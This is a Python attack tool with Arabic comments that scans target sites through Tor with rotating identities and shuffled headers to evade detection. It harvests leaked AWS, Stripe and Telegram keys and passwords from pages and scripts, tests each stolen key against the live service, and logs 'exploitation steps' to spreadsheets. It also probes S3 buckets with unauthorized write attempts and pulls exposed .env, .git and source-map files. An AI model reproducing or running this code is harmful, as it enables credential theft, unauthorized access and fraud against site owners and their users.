import requests, httpx, time, random, subprocess, os, re, boto3, json
import pandas as pd
from stem import Signal
from stem.control import Controller
from fake_useragent import UserAgent
from requests.auth import HTTPBasicAuth
from urllib.parse import urljoin, urlparse

# --- [ الإعدادات والمجلدات ] ---
BASE_DIR = "Data Extraction"
DIR_VULN = "Vulnerability Analysis"
DIR_JS_DATA = "Data and javascript file from targt"
DIR_JS_SECRETS = os.path.join(DIR_JS_DATA, "This data secret from javascript file")

# إنشاء جميع المجلدات المطلوبة
for folder in [BASE_DIR, DIR_VULN, DIR_JS_DATA, DIR_JS_SECRETS]:
    if not os.path.exists(folder): os.makedirs(folder)

UA = UserAgent()
TOR_PATH = r"C:\Users\malek\Downloads\tor servrs using wihe ching ip\tor\tor.exe"
GITHUB_PROXY_URL = "https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/proxylistforbypass.text"

LINKS = {
    "S3_EXT": "https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/list_extension_File_S3.txt",
    "S3_PREFIX": "https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/List_s3_prefixes.txt",
    "DB_DUMPS": "https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/List_dump_dataBase.txt",
    "SECRET_PATHS": "https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/list_secret_path_file_cong.txt",
    "DEP_FILES": "https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/list_dependency_files.txt"
}

# --- [ 1. محرك التخفي والتقنيات السبعة ] ---

def start_tor_service():
    """تشغيل تور تلقائياً وتجنب التدخل اليدوي"""
    try:
        print("[+] Starting Tor Service automatically from path...")
        subprocess.Popen(TOR_PATH, shell=True)
        time.sleep(8)
    except Exception as e:
        print(f"[-] Tor start error: {e}")

def rotate_tor_ip():
    """تبديل الهوية عبر منفذ التحكم 9051"""
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate() 
            controller.signal(Signal.NEWNYM)
            print("[*] Tor IP rotated. Fresh identity acquired.")
            time.sleep(2)
    except: pass

def get_shuffled_headers():
    """تغيير ترتيب الهيدرات وتبديل الـ UserAgent"""
    headers = {
        "User-Agent": UA.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1"
    }
    items = list(headers.items())
    random.shuffle(items)
    return dict(items)

def send_stealth_request(url, method="GET", data=None):
    """المحرك المركزي: يجمع التقنيات السبعة قبل إرسال الطلب"""
    time.sleep(random.uniform(0.5, 2.5)) # Jitter
    proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
    headers = get_shuffled_headers()
    
    try:
        with httpx.Client(http2=True, proxies=proxies, headers=headers, timeout=20) as client:
            if method == "GET":
                response = client.get(url)
            else:
                response = client.post(url, data=data)
            
            if response.status_code in [429, 503]:
                rotate_tor_ip()
            return response
    except:
        return None

# --- [ 2. موديول حفظ التقارير (Excel Manager) ] ---

def save_to_report(directory, filename, data_dict):
    path = os.path.join(directory, filename)
    df = pd.DataFrame([data_dict])
    if not os.path.isfile(path):
        df.to_excel(path, index=False, engine='openpyxl')
    else:
        with pd.ExcelWriter(path, mode='a', engine='openpyxl', if_sheet_exists='overlay') as writer:
            try:
                start_row = writer.book['Sheet1'].max_row
                df.to_excel(writer, index=False, header=False, startrow=start_row)
            except: df.to_excel(writer, index=False)

# --- [ 3. موديول صيد الأسرار والتحقق (Secret Hunter) ] ---

class SecretHunter:
    def __init__(self, content, url):
        self.content = content
        self.url = url

    def hunt(self):
        self.check_aws()
        self.check_payment_keys()
        self.check_comm_tokens()
        self.check_emails_and_passwords()

    def check_aws(self):
        aws_key = re.findall(r"AKIA[0-9A-Z]{16}", self.content)
        aws_sec = re.findall(r"([A-Za-z0-9+/]{40})", self.content)
        if aws_key and aws_sec:
            key, sec = aws_key[0], aws_sec[0]
            try:
                sts = boto3.client('sts', aws_access_key_id=key, aws_secret_access_key=sec)
                id_info = sts.get_caller_identity()
                exploit = "1. Install AWS CLI\n2. aws configure --profile leaked\n3. Run: sts get-caller-identity\n4. Use enumerate-iam for permissions."
                save_to_report(BASE_DIR, "AWSkeyServes.xlsx", {
                    "URL": self.url, "Key": key, "Secret": sec, 
                    "API_Response": json.dumps(id_info, default=str),
                    "Exploitation_Steps": exploit
                })
            except: pass

    def check_payment_keys(self):
        stripe_match = re.findall(r"sk_live_[0-9a-zA-Z]{24}", self.content)
        if stripe_match:
            key = stripe_match[0]
            r = requests.get("https://api.stripe.com/v1/charges", auth=HTTPBasicAuth(key, ''), timeout=10)
            if r.status_code == 200:
                exploit = "1. Use Key in Stripe API\n2. Access /v1/customers\n3. Check /v1/balance for refunds."
                save_to_report(BASE_DIR, "DataExtractionStripePayPal.xlsx", {
                    "URL": self.url, "Key": key, "Status": "Live",
                    "Verification_Request": "GET /v1/charges", "Exploitation_Steps": exploit
                })

    def check_comm_tokens(self):
        tg_match = re.findall(r"\d{9,10}:[a-zA-Z0-9_-]{35}", self.content)
        if tg_match:
            token = tg_match[0]
            r = requests.get(f"https://api.telegram.org/bot{token}/getMe")
            if r.status_code == 200:
                exploit = "1. Use Telegram Bot API\n2. Run getUpdates to read private logs/passwords."
                save_to_report(BASE_DIR, "DataExtractionTelegramDiscordSlack.xlsx", {
                    "URL": self.url, "Platform": "Telegram", "Token": token,
                    "Exploitation_Steps": exploit
                })

    def check_emails_and_passwords(self):
        emails = re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", self.content)
        pass_match = re.findall(r"(?:password|pwd|pass|db_pass)\s*[:=]\s*['\"]([^'\"]+)['\"]", self.content, re.I)
        for email in emails:
            exploit = "1. Search email in DeHashed\n2. Decrypt Found Hash\n3. Try Admin Login with credentials."
            save_to_report(BASE_DIR, "DataExtractionEmailAdmin.xlsx", {"URL": self.url, "Email": email, "Exploitation_Steps": exploit})
        for p in pass_match:
            exploit = f"1. Identify login page\n2. Inject password: {p}\n3. Use for DB/SSH access if applicable."
            save_to_report(BASE_DIR, "passworedFromCodingPage.xlsx", {"URL": self.url, "Found_Password": p, "Exploitation_Steps": exploit})

# --- [ 4. موديول S3 Buckets, Git & .env Hunter ] ---

class InfrastructureHunter:
    def __init__(self, target_url, lists):
        self.url = target_url
        self.domain = target_url.split("//")[-1].split("/")[0].replace("www.", "")
        self.lists = lists

    def run_s3(self):
        for prefix in self.lists.get("S3_PREFIX", []):
            bucket_url = f"https://{prefix}-{self.domain}.s3.amazonaws.com"
            res = send_stealth_request(bucket_url + "?max-keys=10")
            if res and res.status_code == 200 and "<Contents>" in res.text:
                found_sensitive = [ext for ext in self.lists.get("S3_EXT", []) if ext in res.text]
                found_dumps = [d for d in self.lists.get("DB_DUMPS", []) if d in res.text]
                write_status = "Protected"
                try:
                    w_res = requests.put(f"{bucket_url}/Test.txt", data="Security Scan", timeout=5)
                    if w_res.status_code == 200: write_status = "Vulnerable (Write Access)"
                except: pass
                if found_sensitive or found_dumps:
                    exploit = f"1. aws s3 sync s3://{bucket_url.split('//')[1]} ./local\n2. grep for secrets."
                    save_to_report(BASE_DIR, "DataExtractionEnumerationTecknekS3.xlsx", {
                        "URL": bucket_url, "Method": "Enumeration", "Write_Status": write_status,
                        "Sensitive_Files": str(found_sensitive[:5]), "Exploitation_Steps": exploit
                    })

    def run_git_env(self):
        base_url = "/".join(self.url.split("/")[:3])
        for path in self.lists.get("SECRET_PATHS", []):
            target = base_url + path
            res = send_stealth_request(target)
            if res and res.status_code == 200:
                if ".env" in path:
                    exploit = "1. Parse .env for DB_PASSWORD and AWS_KEY\n2. Access SMTP servers."
                    save_to_report(BASE_DIR, "DataExtractionPullGit_evnFileTecknekS3.xlsx", {"URL": target, "Payload": ".env Leak", "Result": "Sensitive Config Exposed", "Exploitation_Steps": exploit})
                if ".git/config" in path:
                    exploit = f"1. Run: git-dumper {base_url}/.git/ ./output\n2. Check git logs."
                    save_to_report(BASE_DIR, "DataExtractionPullGit_evnFileTecknekS3.xlsx", {"URL": target, "Payload": ".git Exposed", "Result": "Source Code Access", "Exploitation_Steps": exploit})

# --- [ 5. موديول Vulnerability Scanner & JS Radar ] ---

class VulnerabilityAndJSRadar:
    def __init__(self, target_url, lists):
        self.target_url = target_url
        self.lists = lists
        self.js_count = 0

    def scan_vulnerabilities(self):
        base_url = "/".join(self.target_url.split("/")[:3])
        for dep_file in self.lists.get("DEP_FILES", []):
            target = urljoin(base_url, dep_file)
            res = send_stealth_request(target)
            if res and res.status_code == 200:
                self.analyze_dependencies(res.text, target)

    def analyze_dependencies(self, content, url):
        found_libs = []
        if "jquery" in content.lower():
            version = re.findall(r"jquery/([0-9.]+)", content)
            if version: found_libs.append({"name": "jQuery", "ver": version[0]})
        
        for lib in found_libs:
            cve_id = f"CVE-MATCHED-{lib['ver']}"
            exploit_url = f"https://www.exploit-db.com/search?q={lib['name']}+{lib['ver']}"
            data = {
                "URL": url, "Library": lib['name'], "Version": lib['ver'],
                "CVE_ID": cve_id, "Exploit_DB_Link": exploit_url,
                "Exploitation_Steps": f"1. Search {cve_id} in Metasploit.\n2. Use Payload for {lib['name']} {lib['ver']}."
            }
            save_to_report(DIR_VULN, "VulnerabilityAnalysisLog4_jQuery.xlsx", data)

    def start_js_radar(self):
        res = send_stealth_request(self.target_url)
        if not res: return
        all_links = re.findall(r'href=["\'](http[s]?://.*?)["\']', res.text)
        internal_paths = re.findall(r'href=["\'](/[a-zA-Z0-9\-_/]+)["\']', res.text)
        with open(os.path.join(DIR_JS_DATA, "Data.txt"), "a", encoding="utf-8") as f:
            for link in all_links + internal_paths:
                f.write(f"{link} >>> This get url from {self.target_url}\n")
        
        js_files = re.findall(r'src=["\'](.*?\.js)["\']', res.text)
        for js_link in js_files:
            full_js_url = urljoin(self.target_url, js_link)
            with open(os.path.join(DIR_JS_DATA, "Javascript.txt"), "a") as f:
                f.write(f"{full_js_url}\n")
            self.analyze_js_file(full_js_url)

    def analyze_js_file(self, js_url):
        self.js_count += 1
        res = send_stealth_request(js_url)
        if not res: return
        secret_file_path = os.path.join(DIR_JS_SECRETS, f"Javascript_data{self.js_count}.txt")
        with open(secret_file_path, "w", encoding="utf-8") as f:
            f.write(f"SOURCE_URL: {js_url}\n" + "="*50 + "\n")
            findings = re.findall(r"(/[a-zA-Z0-9\-_/]*(?:admin|panel|config|login|api/v1)[a-zA-Z0-9\-_/]*)", res.text)
            for item in set(findings): f.write(f"[+] Found Path: {item}\n")

        map_url = js_url + ".map"
        map_res = send_stealth_request(map_url)
        if map_res and map_res.status_code == 200:
            map_name = os.path.basename(js_url) + ".map"
            custom_map_name = f"{map_name.replace('.map', '')} this file capatech from {urlparse(js_url).netloc}.map"
            with open(os.path.join(DIR_JS_SECRETS, custom_map_name), "w", encoding="utf-8") as f:
                f.write(map_res.text)

# --- [ 6. المحرك الرئيسي ] ---

def main():
    start_tor_service()
    
    # تحميل القوائم
    lists = {}
    for key, url in LINKS.items():
        try: lists[key] = requests.get(url, timeout=10).text.splitlines()
        except: lists[key] = []
    
    # جلب الأهداف من ملفات المرحلة السابقة
    target_files = ["path_from_states_200.txt", "path_from_states_403.txt", "path_from_states_404.txt"]
    targets = []
    for f in target_files:
        if os.path.exists(f):
            with open(f, "r") as file: targets.extend(file.read().splitlines())
    targets = list(set(targets))

    print(f"[!] Engine Started. Processing {len(targets)} targets...")

    for url in targets:
        print(f"[*] Full Analysis: {url}")
        res = send_stealth_request(url)
        if res:
            SecretHunter(res.text, url).hunt()
            infra = InfrastructureHunter(url, lists)
            infra.run_s3()
            infra.run_git_env()
            
            vuln_radar = VulnerabilityAndJSRadar(url, lists)
            vuln_radar.scan_vulnerabilities()
            vuln_radar.start_js_radar()

if __name__ == "__main__":
    main()
